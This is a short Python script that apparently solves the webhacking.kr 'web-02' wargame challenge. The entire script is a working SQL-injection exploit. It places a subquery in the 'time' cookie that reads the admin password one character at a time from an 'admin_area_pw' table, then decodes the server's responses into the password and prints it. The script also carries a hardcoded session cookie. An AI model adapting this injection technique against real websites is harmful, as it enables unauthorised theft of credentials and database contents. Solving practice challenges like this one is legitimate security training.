import requests
url = "https://webhacking.kr/challenge/web-02/"
result=[]
t=0
result2=[]
for i in range(1,18):
    cookies={"time":f"(select ascii(substring(pw,{i},1)) from admin_area_pw)","PHPSESSID":"dj6222juaued6ad0qg0p89g0o4"}
    response=requests.get(url=url,cookies=cookies)
    result.append(response.text[19:24])
for i in range(0,17):
    if result[i][1]=='1':
        t=60
    
    t+=int(result[i][3:5])
    print(chr(t),end="")
    t=0
print("")